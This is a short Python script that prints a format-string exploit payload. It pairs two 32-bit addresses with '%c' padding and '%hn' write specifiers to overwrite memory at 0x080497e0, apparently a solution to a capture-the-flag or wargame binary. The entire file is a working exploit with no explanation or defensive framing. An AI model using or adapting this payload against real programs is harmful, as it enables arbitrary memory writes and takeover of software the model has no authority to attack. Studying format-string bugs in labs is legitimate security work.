import sys, time

adress_1 = "\xe0\x97\x04\x08" #0x080497e0
adress_2 = "\xe2\x97\x04\x08" #0x080497e2

payload = adress_1 + adress_2 + "%57017c" + "%10$hn" + "%8510c" + "%11$hn\n"

sys.stdout.write(payload)